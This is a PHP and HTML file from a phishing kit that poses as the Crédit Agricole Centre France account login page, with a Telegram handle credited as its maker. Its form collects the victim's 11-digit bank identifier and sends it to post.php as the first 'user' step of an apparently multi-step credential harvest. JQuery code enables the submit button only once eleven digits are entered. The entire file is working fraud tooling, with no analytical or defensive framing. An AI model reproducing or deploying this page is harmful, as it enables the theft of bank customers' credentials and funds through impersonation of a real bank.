<?php 

     require_once "function.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Accéder à mes comptes - Crédit Agricole Centre France</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicone.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicone.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/over.css">
</head>
<body>
        

        <div class="navbar">
             <div class="coantainer-fluid"> 
                  <img src="image/far.jpg">
                  <span><i class="bi bi-x"></i></span>
             </div>
        </div>

        <div class="togather">
             <div class="container-fluid">
                  <div class="left box">
                       <div class="imaga">
                            <div class="decovrer">
                                 <button class="btn">DÉCOUVREZ-LA !</button>
                            </div>
                       </div>
                  </div>
                  <div class="right box">
                    <h1>ACCÉDER À MES COMPTES</h1>
                    <div class="row gx-3">
                         <div class="col-lg-6 col-md-6">
                              <div class="login">
                                   <h6>IDENTIFIANT</h6>
                                   <p>Saisissez votre identifiant à 11 <br>chiffres</p>
                                   <form action="post.php" method="post">
                                        <input type="hidden" name="step" value="user">
                                        <div class="form-group tiktok">
                                             <input type="text" name="indefient" id="indefiant" class="form-control" placeholder="Exemple 98652706859" maxlength="11">
                                             <i class="bi bi-x" id="close"></i>
                                        </div>
                                        <button class="btn" name="submit" id="sent">Entrer mon code personnel</button>
                                        <div class="quition text-center">Vous n’êtes pas encore client ?</div>
                                        <button class="btn" name="submit" id="pips">Devenir client</button>
                                   </form>
                              </div>
                         </div>
                         <div class="col-lg-6 col-md-6">
                              <div class="blabla">
                                   <h5><b> UN PROBLÈME TECHNIQUE </b><br>LORS DE VOTRE CONNEXION ?</h5>
                                   <p>Pour accéder à votre compte, saisissez votre identifiant (numéro de compte ou numéro de contrat Crédit Agricole En Ligne) et votre code personnel habituels. </p>
                                   <p>Code perdu / Oublié ? <a href="#"> Cliquez ici</a> pour régénérer votre code confidentiel.</p>
                                   <h5><b>BESOIN D'AIDE</b></h5>
                                   <p>Besoin d’aide sur votre nouveau site, découvrez <a href="">l’assistance en ligne.</a> </p>
                                   <p>Pour tout autre demande, merci de vous rapprocher de votre agence.</p>
                                   <h5><b>SÉCURITÉ<b></h5>
                                   <p>Restez vigilants et veillez à protéger vos données personnelles.</p>
                                   <p>Consultez nos <a href="">conseils de sécurité.</a></p>
                                   <p>Nous vous invitons également à consulter régulièrement nos <a href="">Conditions Générales d'Utilisation.</a></p>
                              </div>
                         </div>
                    </div>
                  </div>
             </div>
        </div>

        

        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
                
           $("#indefiant").keyup(function(){
               if($("#indefiant").val().length > 0){
                    $("#close").show();
               }else{
                    $("#close").hide();
               }
           })
           $("#close").click(function(){
               $("#indefiant").val("");
               $("#indefiant").focus();
           });

           $("#sent").attr('disabled',true);
           $("#indefiant").keyup(function(){
               if($("#indefiant").val().length > 10){
                    $("#sent").attr('disabled',false);
                    $("#sent").css({background:'#007461',color:'white'});
               }else{
                    $("#sent").attr('disabled',true);
                    $("#sent").css({background:'#ECEDF0',color:'#C6C9D3'});
               }
           })
        </script>
              
</body>
</html>